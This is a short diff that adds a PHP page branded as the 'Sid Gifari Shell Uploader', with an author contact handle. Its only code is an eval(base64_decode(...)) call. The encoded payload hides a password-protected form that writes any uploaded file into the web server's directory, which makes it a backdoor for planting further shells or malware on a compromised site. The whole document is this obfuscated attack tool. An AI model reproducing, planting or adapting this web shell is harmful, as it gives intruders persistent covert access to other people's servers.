@@ -1,0 +1,18 @@
+<center><h1>Sid Gifari Shell Uplaoder</h1></center>
+<center><h3>ICQ:@sidgifari1234</h3></center>
+<div align="center"> <img src = "https://i.imgur.com/uhEZ27E.jpg"width="200" height="150"></img>
+<?php
+eval(base64_decode('aWYoaXNzZXQoJF9QT1NUWyd1cGxvYWRlZCddKSl7JGZpbGU9JF9GSUxFU1snZmlsZXMnXVsnbmFt
+ZSddOyRmaWxlcz0kX0ZJTEVTWydmaWxlcyddWyd0bXBfbmFtZSddOyRmb2xkZXI9IiI7aWYobW92
+ZV91cGxvYWRlZF9maWxlKCRmaWxlcywkZm9sZGVyLiRmaWxlKSl7JHJlc3VsdD0iVXBsb2FkZWQg
+OiA9PiA8QSBocmVmPSckZmlsZScgdGFyZ2V0PSdfYmxhbmsnPllvdXIgZmlsZSBoZXJlPC9BPiI7
+fWVsc2UgeyRyZXN1bHQ9IkZhaWxlZCB0byB1cGxvYWQuLi4hIjt9fSRwYXNzd29yZD0ic2lkMTIz
+NCEiO2lmKCRfR0VUWydwYXNzJ109PSRwYXNzd29yZCl7ZWNobyAnPGJyIC8+PGJyIC8+PGJyIC8+
+PGh0bWw+CjxoZWFkPjx0aXRsZT5TaWQgVXBsb2FkZXI8L3RpdGxlPjwvaGVhZD4KPGNlbnRlcj48
+aDE+U2lkIEdpZmFyaSBXZWJTaGVsbCBVcGxhb2RlcjwvaDE+PC9jZW50ZXI+CjxjZW50ZXI+PGg0
+PklDUTpzaWRnaWZhcmkxMjM0PC9oND48L2NlbnRlcj4KPGRpdiBhbGlnbj0iY2VudGVyIj48YnI+
+PGJyPjxicj48YnI+PGNlbnRlcj48Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBlbmN0eXBl
+PSJtdWx0aXBhcnQvZm9ybS1kYXRhIj4KPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGVzIiAv
+Pgo8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJ1cGxvYWRlZCIgdmFsdWU9IlVwbG9hZCI+Cjwv
+Zm9ybT4nLiRyZXN1bHQuJzwvY2VudGVyPjwvYm9keT48L2h0bWw+Jzt9Pz4='))
+?>
